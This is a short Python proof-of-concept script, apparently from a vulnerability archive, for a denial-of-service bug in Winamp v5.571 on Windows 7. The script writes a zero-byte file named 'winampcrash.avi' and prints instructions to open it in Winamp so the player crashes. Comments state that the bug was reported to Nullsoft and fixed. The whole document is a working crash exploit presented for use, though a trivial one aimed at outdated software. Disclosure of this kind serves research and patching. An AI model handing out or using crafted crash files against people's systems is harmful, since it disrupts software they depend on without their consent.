# Tested on Windows 7 and Winamp v5.571(x86)
# This bug is informed to Nullsoft and was fixed long back.
# The status can be found at http://forums.winamp.com/showthread.php?s=&threadid=316000
# This code works on Python 3.0. To make it work on <3.0 remove braces in print

print("\n***Winamp v5.571 malicious AVI file handling DoS Vulnerability***\n")

try:
        open('winampcrash.avi', 'w')
        print ("Creating malicious AVI file . . . \n")
        print ("Successfully created Zero size AVI file\n")
        print ("Open created Zero size AVI file in Winamp.....Boom\n\n")
except IOError:
        print ("Unable to create Zero size AVI file\n")
